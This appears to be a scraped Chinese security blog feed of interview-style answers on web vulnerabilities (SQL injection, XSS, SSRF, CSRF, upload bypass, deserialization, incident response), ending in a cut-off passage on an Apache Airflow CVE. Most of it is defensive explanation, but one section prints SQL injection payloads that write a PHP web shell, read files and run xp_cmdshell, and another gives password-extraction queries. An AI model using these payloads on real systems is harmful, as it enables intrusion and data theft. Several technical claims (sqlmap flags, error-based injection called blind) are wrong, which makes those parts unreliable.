title="sql注入产生的原因是什么"></a>sql注入产生的原因是什么</h2><p>SQL注入是一种攻击技术，它利用应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向应用程序的后台数据库中插入恶意代码。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p><p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p><p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p><h2 id="sql注入怎么修复"><a href="#sql注入怎么修复" class="headerlink" title="sql注入怎么修复"></a>sql注入怎么修复</h2><p>修复SQL注入漏洞的主要方法之一是使用参数化查询。这种技术可以将用户输入作为参数传递给数据库查询，而不是将其拼接到查询字符串中。通过这种方式，应用程序可以避免恶意用户在输入中注入任何SQL代码。</p><p>另一个修复SQL注入漏洞的方法是对输入数据进行严格的验证和过滤。这需要开发人员仔细检查所有用户输入数据，并确保它们只包含有效的字符和格式。例如，如果一个输入字段只接受数字，则必须验证输入是否仅包含数字，并拒绝包含其他字符的输入。</p><p>最后，还可以使用安全的编程实践来保护应用程序免受SQL注入攻击。这包括限制应用程序的权限以及使用加密和身份验证等安全措施来保护数据库服务器和应用程序。</p><p>总之，修复SQL注入漏洞的关键是开发人员需要了解并理解如何处理用户输入，并采取必要的措施来确保输入数据的完整性和安全性。</p><h2 id="xss是什么"><a href="#xss是什么" class="headerlink" title="xss是什么"></a>xss是什么</h2><p>XSS（Cross-site scripting）是一种攻击技术，也是Web应用程序中最常见的漏洞之一。它利用了应用程序没有正确过滤或转义用户输入的数据，导致恶意用户可以向网站上注入恶意脚本代码，使其他用户在浏览网站时受到攻击。</p><p>XSS攻击通常发生在包含表单、搜索框和评论框等用户输入区域的Web页面上。攻击者会向这些输入框中插入包含恶意脚本代码的数据，以便当其他用户在访问该页面时执行这些恶意代码，从而实现攻击目的。</p><p>例如，如果一个在线购物网站没有对用户在评论框中输入的HTML代码进行过滤，那么攻击者可以通过在评论框中注入恶意JavaScript代码来窃取其他用户的登录凭证或个人信息。</p><p>因此，要防止XSS攻击，开发人员需要对所有用户输入进行严格的验证和处理，并对任何输入的数据进行必要的过滤和转义，以确保所有输入的数据都不能被解释为恶意脚本。此外，还可以使用安全的编程实践和安全框架来保护网站免受XSS攻击的危害。</p><h2 id="xss攻击如何防御"><a href="#xss攻击如何防御" class="headerlink" title="xss攻击如何防御"></a>xss攻击如何防御</h2><p>为了防止XSS攻击，开发人员可以采用以下措施：</p><ol><li><p>输入过滤和验证：对于用户输入的数据进行严格的过滤和验证，只允许输入必要的字符和格式，并拒绝不受支持的HTML、CSS或JavaScript代码。</p></li><li><p>输出编码和转义：在将任何用户输入输出到Web页面上之前，请确保对其进行编码和转义，以确保它们不会被解释为恶意脚本。例如，在输出HTML时，可以使用HTML实体编码将特殊字符（如&lt;、&gt;、&amp;）转换为等效的字符实体。这样可以避免浏览器将它们解释为HTML标签或JavaScript代码。</p></li><li><p>使用安全框架和库：许多Web应用程序框架和安全库提供了内置的XSS防御机制，例如跨站点请求伪造（CSRF）令牌和自动输出编码。使用这些框架和库可以大大减少XSS攻击的风险。</p></li><li><p>学习安全编程实践：开发人员应该学习并遵循安全编程实践，例如安全的HTTP头设置、HTTPS使用、安全的Cookie管理等。</p></li><li><p>定期漏洞扫描和修复：定期运行漏洞扫描工具来检测网站中的潜在XSS漏洞，并及时修复这些漏洞，以避免遭受攻击。</p></li><li><p>加强用户教育：通过向用户提供安全意识培训和提示，可以帮助他们了解如何保护自己不受XSS攻击的危害，例如不点击垃圾邮件中的链接，不下载未经验证的文件等。</p></li></ol><h2 id="ssrf是什么"><a href="#ssrf是什么" class="headerlink" title="ssrf是什么"></a>ssrf是什么</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）是一种攻击技术，攻击者通过在受害者服务器上执行恶意代码，使该服务器对指定的目标URL发起网络请求。这种攻击通常利用了开发人员在编写Web应用程序时没有正确处理用户输入数据的漏洞，例如将用户提供的URL参数直接传递给后台服务器而没有做任何验证。</p><p>在SSRF攻击中，攻击者可以欺骗Web应用程序向其他服务器发送HTTP请求，例如内部服务器、本地网络资源或公共Web API等。攻击者还可以使用SSRF攻击来绕过防火墙保护，访问内部系统，并执行未授权的操作，例如读取机密数据、修改配置文件或上传恶意文件等。</p><p>为了避免SSRF攻击，开发人员需要采取以下措施：</p><ol><li><p>对所有输入进行严格的验证和过滤：开发人员在编写Web应用程序时应对所有输入数据进行严格的验证和过滤，以确保不会将任何恶意代码或非法请求发送到受害者服务器。</p></li><li><p>使用白名单：开发人员可以使用白名单技术限制应用程序仅向可信的服务器发送请求，例如内部服务器或特定的Web API。</p></li><li><p>限制服务器端请求发出范围： 在服务器上的Web应用程序必须限制服务器端请求的发出范围，例如通过禁止或限制特定的协议、域名或IP地址，以避免攻击者可以利用SSRF漏洞来发送恶意请求。</p></li><li><p>防火墙保护：使用防火墙的隔离技术可帮助防止恶意代码和非法请求进入Web应用程序，并限制其对其他系统的访问。</p></li></ol><h2 id="ssrf和csrf的区别"><a href="#ssrf和csrf的区别" class="headerlink" title="ssrf和csrf的区别"></a>ssrf和csrf的区别</h2><p>SSRF（Server-side Request Forgery，服务端请求伪造）和CSRF（Cross-site Request Forgery，跨站请求伪造）是两种不同的攻击类型，它们主要的区别在于攻击的目标和方式。</p><p>SSRF攻击是一种通过欺骗服务器来发送恶意请求的攻击技术，攻击者利用服务器上的漏洞进行攻击，并使服务器对指定的目标URL发起网络请求，从而达到恶意操作的目的。SSRF攻击主要针对服务器端应用程序。</p><p>而CSRF攻击则是一种利用用户身份验证信息来执行未经授权的操作的攻击，攻击者通过欺骗用户访问包含恶意代码的网站，来达到获取用户敏感信息、执行交易等攻击目的。CSRF攻击主要针对客户端浏览器。</p><p>另外，防御SSRF攻击和CSRF攻击的方法也有所不同。防御SSRF攻击需要对所有输入进行严格的验证和过滤，并使用白名单技术限制应用程序只向可信的服务器发送请求。而防御CSRF攻击需要使用随机的令牌（如CSRF Token）来验证每个请求的来源是否合法，并防止攻击者能够伪造请求或欺骗用户进行非法操作。</p><p>总之，虽然SSRF攻击和CSRF攻击是两种不同的攻击类型，但它们都需要开发人员采取必要的防御措施来确保Web应用程序和用户数据的安全。</p><h2 id="文件上传如何绕过"><a href="#文件上传如何绕过" class="headerlink" title="文件上传如何绕过"></a>文件上传如何绕过</h2><p>文件上传功能是许多Web应用程序中常见的功能之一，它可以让用户上传各种类型的文件。然而，如果没有正确的安全措施，攻击者可能会利用文件上传功能绕过应用程序的安全性控制并上传恶意文件。以下是一些攻击者可能使用的绕过方法：</p><ol><li><p>修改文件扩展名：攻击者可以将可执行文件的扩展名更改为其他文件格式的扩展名，例如将.exe文件更改为.jpg文件。这样，即使应用程序检查文件扩展名，也会认为该文件是合法的图像文件。</p></li><li><p>绕过文件类型检查：应用程序通常会限制上传文件的MIME类型或文件头，以确保只允许上传合法的文件。但是，攻击者可以通过修改文件头或添加特殊字符等方式来伪装文件类型和内容，从而绕过文件类型检查。</p></li><li><p>利用漏洞：应用程序可能存在漏洞，如目录遍历、任意文件上传等漏洞，攻击者可以利用这些漏洞来上传恶意文件，并在服务器上执行任意代码。</p></li></ol><p>为了防止文件上传漏洞被攻击者利用，开发人员可以采取以下措施：</p><ol><li><p>对所有上传文件进行严格的验证和过滤：开发人员应该对上传的文件类型、大小、MIME类型等进行严格的验证和过滤，确保只允许上传合法的文件。并且在服务器端进行对上传文件类型、大小、MIME类型等的再次检查。</p></li><li><p>为上传文件生成唯一的文件名：开发人员可以为每个上传文件生成唯一的文件名，以避免攻击者通过上传恶意文件来覆盖或修改其他文件。</p></li><li><p>使用安全的文件上传库：使用安全的文件上传库，例如PHP的move_uploaded_file函数可以确保文件上传的安全性。</p></li><li><p>对上传目录设置权限：只允许应用程序访问上传目录，并设置适当的目录权限，以防止攻击者上传和执行恶意文件。</p></li></ol><p>总之，开发人员需要对文件上传功能进行充分的安全测试，并采取必要的措施来防止攻击者利用漏洞绕过文件上传功能的安全限制。</p><h2 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h2><p>Java反序列化是一种Java对象序列化（将Java对象转换为字节流）的逆过程，即将字节流重新转换回Java对象。在Java中，可以使用ObjectInputStream类来实现反序列化。虽然Java反序列化本身是一种有用的技术，但它也可能导致安全风险。</p><p>Java反序列化漏洞是指恶意用户通过发送精心构造的序列化数据并触发其反序列化过程，从而执行未经授权的代码或操作。攻击者可以利用此漏洞来执行远程命令、绕过应用程序的安全检查、窃取敏感信息等攻击。</p><p>为了防止Java反序列化漏洞的攻击，开发人员可以采取以下措施：</p><ol><li><p>处理未信任的数据：开发人员应该避免反序列化未受信任的数据，例如来自不可靠来源的网络请求或从未知来源的文件读取的数据。</p></li><li><p>使用安全的序列化库：一些第三方序列化库，如Jackson和Gson等，提供了更加安全的序列化和反序列化功能。开发人员可以使用这些库来避免Java反序列化漏洞。</p></li><li><p>实现自定义反序列化方法：对于那些包含重要数据且需要进行反序列化的Java对象，可以实现自定义反序列化方法以控制反序列化过程。</p></li><li><p>消除未使用的反序列化代码：如果没有必要进行反序列化操作，开发人员可以将其删除或注释掉，以减少潜在的攻击面。</p></li><li><p>定期更新和维护应用程序：及时更新和修复应用程序中的漏洞和错误，并使用相关的安全工具来检测和防止Java反序列化漏洞。</p></li></ol><p>总之，要解决Java反序列化漏洞，开发人员需要对代码进行充分的安全测试，加强对数据的严格验证和过滤，并采取必要的措施来保护应用程序的安全性。</p><h2 id="sql注入如何写shell"><a href="#sql注入如何写shell" class="headerlink" title="sql注入如何写shell"></a>sql注入如何写shell</h2><p>在SQL注入攻击中，如果攻击者成功地注入了一些恶意的SQL代码，则可以利用这些漏洞来执行各种操作，包括编写shell。以下是攻击者可能使用的几种技术：</p><ol><li>利用UNION SELECT语句：通过构造一个带有UNION SELECT语句的SQL查询，攻击者可以在结果集中插入一些命令，并通过这些命令来编写shell，例如在 MySQL 中可以使用 INTO OUTFILE 来将结果输出到文件中。</li></ol><p>例如，以下语句可以在MySQL中编写shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://example.com/products.php?id=1 UNION SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,2 INTO OUTFILE &quot;/var/www/html/shell.php&quot;;</span><br></pre></td></tr></table></figure><ol><li>利用LOAD_FILE函数：如果应用程序允许使用LOAD_FILE函数加载文件，攻击者可以使用该函数来读取并执行任意的本地shell脚本文件。</li></ol><p>例如，在MySQL中，攻击者可以使用以下代码来读取并执行一个本地shell脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://example.com/products.php?id=-1&#x27; UNION SELECT LOAD_FILE(&#x27;/path/to/malicious/script.sh&#x27;),&#x27;&#x27;,&#x27;&#x27;</span><br></pre></td></tr></table></figure><ol><li>利用指定数据库的存储过程：攻击者可以使用存储过程来创建和执行恶意的shell脚本，例如在Microsoft SQL Server中，可以使用以下代码来创建并执行一个命令解释器：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CREATE PROCEDURE sp_ExecCmd (@cmd varchar(1000))</span><br><span class="line">AS</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE @ret int</span><br><span class="line">EXEC @ret = master..xp_cmdshell @cmd</span><br><span class="line">END</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">EXEC sp_ExecCmd &#x27;command&#x27;</span><br></pre></td></tr></table></figure><p>攻击者利用SQL注入漏洞来执行命令或编写shell是非常危险的，因此，在编写应用程序时必须采用适当的安全措施，例如对所有输入数据进行严格的验证和过滤，并使用参数化查询来避免SQL注入攻击。</p><h2 id="sqlmap中risk和levels区别"><a href="#sqlmap中risk和levels区别" class="headerlink" title="sqlmap中risk和levels区别"></a>sqlmap中risk和levels区别</h2><p>在SQL注入扫描器sqlmap中，-r 参数表示风险等级，-level 参数表示扫描等级。这两个参数的区别如下：</p><ol><li>风险等级（-r 或 –risk）：表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。</li><li>扫描等级（-level 或 –level）：表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。</li></ol><p>总之，在使用 sqlmap 进行 SQL 注入扫描时，我们需要根据情况调整风险等级和扫描等级，以达到最优的扫描效果。同时，还需要注意 sqlmap 执行测试过程中对目标系统造成的影响，避免对目标系统产生不必要的影响。</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>报错注入也被称为盲注入，是一种 SQL 注入技术。在报错注入中，攻击者试图向目标系统发送恶意的 SQL 查询并观察系统返回的错误消息，从而了解数据库中存储的敏感数据或执行其它攻击。</p><p>您提到的“报错注入函数”，可能是指用于触发报错注入的 SQL 函数。以下是一些常见的用于报错注入的 SQL 函数：</p><ol><li>SUBSTRING() 函数：该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;users&#x27; LIMIT 1),1,1);</span><br></pre></td></tr></table></figure><ol><li>LENGTH() 函数：该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT LENGTH((SELECT username from users WHERE id=1));</span><br></pre></td></tr></table></figure><ol><li>ASCII() 函数：该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT ASCII(SUBSTRING((SELECT password from users WHERE username=&#x27;admin&#x27;),1,1));</span><br></pre></td></tr></table></figure><p>总之，报错注入是一种危险的攻击方式，可以导致泄漏敏感信息、执行未经授权的操作等安全问题。因此，开发人员必须采取适当的安全措施，例如对所有输入数据进行验证和过滤，不要直接拼接 SQL 语句，使用参数化查询等。同时，也应该定期测试应用程序以检测是否存在 SQL 注入漏洞。</p><h2 id="支持报错注入的数据库都有哪些"><a href="#支持报错注入的数据库都有哪些" class="headerlink" title="支持报错注入的数据库都有哪些"></a>支持报错注入的数据库都有哪些</h2><p>报错注入是一种比较常见的 SQL 注入技术，不同的数据库在报错注入方面的支持程度不同。以下是一些主要的数据库和它们在报错注入方面的支持情况：</p><ol><li><p>MySQL：MySQL 是一个流行的开源关系型数据库管理系统，它对报错注入提供了很好的支持。</p></li><li><p>Microsoft SQL Server：Microsoft SQL Server 是微软开发的关系型数据库管理系统，它对报错注入也提供了很好的支持。</p></li><li><p>Oracle：Oracle 是一个功能强大的商业级数据库管理系统，它对报错注入的支持相对较差。</p></li><li><p>PostgreSQL：PostgreSQL 是一个开源的对象关系型数据库管理系统，它对报错注入的支持相对较好。</p></li><li><p>SQLite：SQLite 是一个嵌入式关系型数据库管理系统，它对报错注入的支持较弱。</p></li></ol><p>总之，在进行 SQL 注入测试时，我们需要针对目标数据库的特定版本和配置进行适当的测试，并注意不同数据库之间在报错注入方面的区别。同时，开发人员在编写应用程序时，应该采取适当的安全措施来防止 SQL 注入攻击。</p><h2 id="一个登录框怎么测试"><a href="#一个登录框怎么测试" class="headerlink" title="一个登录框怎么测试"></a>一个登录框怎么测试</h2><p>对于一个登录框，我们需要进行以下测试：</p><ol><li><p>验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。</p></li><li><p>测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效<br>的凭据进行登录，确保会收到相应的错误提示信息。</p></li><li><p>测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。</p></li><li><p>测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。</p></li><li><p>测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。</p></li><li><p>测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。</p></li><li><p>测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。</p></li></ol><p>总之，在测试一个登录框时，我们需要全面考虑各种安全问题，并进行针对性的测试，以确保应用程序的安全。</p><h2 id="csrf产生原因是什么"><a href="#csrf产生原因是什么" class="headerlink" title="csrf产生原因是什么"></a>csrf产生原因是什么</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击是一种常见的 Web 安全漏洞，它利用用户在已登录的情况下访问恶意网站时，绕过同源策略，以用户身份执行未经授权的操作。</p><p>CSRF 攻击产生的原因主要有两个：</p><ol><li><p>Web 中的一些重要请求不合理地使用了 GET 方法：通常情况下，GET 方法用于获取资源，而 POST 方法用于提交数据。但是，在 Web 应用程序中，有时会把一些重要的请求用 GET 方法来实现，例如修改密码、转账等操作，这样容易被攻击者利用。</p></li><li><p>应用程序没有正确验证用户的来源：当应用程序接受到一个请求时，如果没有正确验证请求的来源是否合法，那么攻击者可以通过构造伪造的请求，以用户身份执行未经授权的操作。</p></li></ol><p>总之，要防止 CSRF 攻击，开发人员需要确保应用程序中所有的关键请求都使用 POST 方法，同时，还需要对请求进行适当的验证和授权，例如添加随机 token 或验证码等机制，以确保请求的来源是合法的。</p><h2 id="sql注入的种类"><a href="#sql注入的种类" class="headerlink" title="sql注入的种类"></a>sql注入的种类</h2><p>SQL注入是一种常见的Web应用程序攻击，攻击者通过执行恶意的SQL查询来窃取敏感信息、修改数据或者执行其他危害行为。根据攻击者的不同攻击手段和目的，SQL注入可以分为以下几种类型：</p><ol><li><p>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</p></li><li><p>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</p></li><li><p>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。</p></li><li><p>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值，例如真或假。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</p></li><li><p>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。</p></li></ol><p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p><h2 id="api环境下sql注入如何防御"><a href="#api环境下sql注入如何防御" class="headerlink" title="api环境下sql注入如何防御"></a>api环境下sql注入如何防御</h2><p>在 API 环境下，防止 SQL 注入攻击的方法和 Web 应用程序类似，主要包括以下几个方面：</p><ol><li><p>输入验证：开发人员需要对所有输入数据进行有效性验证，包括参数、请求体、请求头等。在验证输入时，可以使用正则表达式或白名单过滤等方法来确保输入数据的合法性。</p></li><li><p>参数化查询：在构造 SQL 查询语句时，需要使用参数化查询方式，而不是直接将输入数据拼接到 SQL 查询语句中。参数化查询可以使得 SQL 查询语句与输入数据分离，从而避免 SQL 注入漏洞的出现。</p></li><li><p>权限控制：开发人员需要对每个用户进行适当的身份认证和授权，以确保只有经过授权的用户才能访问敏感资源。在授权的过程中，还需要对用户所能访问的数据进行限制，例如使用视图或存储过程来限制用户的访问权限。</p></li><li><p>安全审计：监测应用程序的行为并记录日志，以便在发生异常情况时进行排查和调试。安全审计可以帮助开发人员及时发现潜在的漏洞和安全问题，并采取相应的措施加以修复。</p></li><li><p>定期更新：定期更新数据库软件及其组件，以确保应用程序使用的数据库软件版本是最新的，从而避免已知漏洞的利用。</p></li></ol><p>总之，在 API 环境下，开发人员需要采取多种措施来保护应用程序的安全，并避免 SQL 注入攻击的出现。同时，还应该定期进行安全审计和漏洞扫描，及时发现并修复安全问题。</p><h2 id="cs流量特征？"><a href="#cs流量特征？" class="headerlink" title="cs流量特征？"></a>cs流量特征？</h2><p>C&#x2F;S（Client&#x2F;Server，客户端&#x2F;服务器）流量是指基于客户端和服务器之间的通信产生的网络流量。C&#x2F;S 流量特征包括以下几个方面：</p><ol><li><p>会话建立：C&#x2F;S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。</p></li><li><p>数据传输：传输数据是 C&#x2F;S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。</p></li><li><p>响应时间：C&#x2F;S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。</p></li><li><p>协议类型：C&#x2F;S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。</p></li><li><p>应用程序特点：C&#x2F;S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等，这些特点对于分析和识别流量非常有帮助。</p></li></ol><p>总之，在分析 C&#x2F;S 流量时，需要综合考虑多个方面的特征，并结合具体的应用程序和场景进行分析。同时，也需要使用适当的工具和技术，例如协议解码器、流量捕获工具等，来对流量进行捕获和分析。</p><h2 id="msf流量特征？"><a href="#msf流量特征？" class="headerlink" title="msf流量特征？"></a>msf流量特征？</h2><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p><ol><li><p>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</p></li><li><p>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</p></li><li><p>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</p></li><li><p>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</p></li><li><p>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</p></li></ol><p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS&#x2F;IPS 等，来对 MSF 流量进行捕获和分析。</p><h2 id="动态链接库劫持应急响应应该怎么做"><a href="#动态链接库劫持应急响应应该怎么做" class="headerlink" title="动态链接库劫持应急响应应该怎么做"></a>动态链接库劫持应急响应应该怎么做</h2><p>动态链接库劫持（也称 DLL 劫持）是一种常见的攻击手段，攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的。在发现动态链接库劫持时，应该采取以下措施进行应急响应：</p><ol><li><p>隔离受影响的系统：立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。</p></li><li><p>恢复被劫持的 DLL 文件：找到被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。</p></li><li><p>检查并清除恶意代码：检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。</p></li><li><p>修改注册表：修改注册表，防止恶意 DLL 文件再次被加载。例如，可以修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。</p></li><li><p>加强安全措施：评估系统的安全性，并加强安全措施。例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。</p></li></ol><p>总之，在应对动态链接库劫持时，需要快速响应，并采取适当的措施进行恢复和防御，以保护系统和敏感数据的安全性。同时也需要加强监测和预防工作，对系统中的 DLL 文件进行定期检查，并实施安全审计和漏洞扫描等措施，避免类似攻击的再次出现。</p><h2 id="几台服务器在内网，其中一台被打穿，如何排查？"><a href="#几台服务器在内网，其中一台被打穿，如何排查？" class="headerlink" title="几台服务器在内网，其中一台被打穿，如何排查？"></a>几台服务器在内网，其中一台被打穿，如何排查？</h2><p>在一台服务器被攻破后，我们需要快速采取措施进行排查和修复，以下是一些可能的步骤：</p><ol><li><p>保留现场：在发现一台服务器遭到攻击后，首先要保持现场状态不变，尽量不要修改任何文件或日志。这可以帮助我们更好地了解攻击者的行为、恶意代码的传播路径以及其他可能受到影响的系统或数据。</p></li><li><p>收集证据：收集有关攻击的证据，例如入侵检测日志、应用程序日志、网络流量捕获等。这些证据可以帮助我们确定攻击的类型、攻击的时间以及攻击者所使用的工具和技术。</p></li><li><p>切断网络连接：为了防止恶意代码继续传播，需要切断受感染服务器与外部网络的连接。这可以通过拔掉网络电缆、关闭相关端口或禁用网络适配器等方法实现。</p></li><li><p>分析恶意代码：对受感染服务器上的恶意代码进行分析，以确定其行为、传播方式和危害程度。可以使用杀毒软件、反病毒软件或专业的样本分析工具来进行分析。</p></li><li><p>验证系统完整性：验证系统文件和配置是否被恶意代码篡改，例如检查系统文件的哈希值、比较配置文件的差异等。</p></li><li><p>进行漏洞扫描：对整个内网进行漏洞扫描，以确保其他服务器没有被攻击。可以使用专业的漏洞扫描工具来进行扫描，例如 Nessus、OpenVAS 等。</p></li><li><p>加强安全措施：根据攻击者的入侵方式和攻击的原因，加强系统和网络的安全措施，例如更新补丁、升级软件、增强防火墙规则等。</p></li></ol><p>总之，在排查一台服务器被攻击后，需要采取快速而有针对性的措施，并结合具体情况进行分析和修复，以保护系统和敏感数据的安全性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Windows-入侵排查思路？&quot;&gt;&lt;a href=&quot;#Windows-入侵排查思路？&quot; class=&quot;headerlink&quot; title=&quot;Windows 入侵排查思路？&quot;&gt;&lt;/a&gt;Windows 入侵排查思路？&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;收集信息：收集与系</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Apache Airflow CVE-2020-17526</title>
    <link href="http://example.com/2023/04/10/Apache%20Airflow%20CVE-2020-17526/"/>
    <id>http://example.com/2023/04/10/Apache%20Airflow%20CVE-2020-17526/</id>
    <published>2023-04-10T12:02:45.000Z</published>
    <updated>2023-04-11T04:57:46.533Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Airflow"><a href="#Apache-Airflow" class="headerlink" title="Apache Airflow"></a>Apache Airflow</h2><p>Apache-Airflow 是Airbnb开源的一款python编写的数据流程工具,它有一个基于Flask框架开发的Web应用，且用Flask 的无状态签名 cookie 来存储和管理成功的身份验证。</p><h2 id="Flask-Cookie"><a href="#Flask-Cookie" class="headerlink" title="Flask Cookie"></a>Flask Cookie</h2><p>在 1.10.13 之前的版本中，Apache Airflow 使用默认会话 secert 密钥，这会导致在启用身份验证时模拟任意用户。</p><p>一般来说，较为安全的session是经过加密的，用户端不可读的，但是在Flask中并非如此，它的cookie是由 session date，时间戳Timestamp，签名HMAC 组成的，以’.’分隔开来。</p><p>[session_date.Timetamp.HMAC]</p><p>第一段其实就是base64 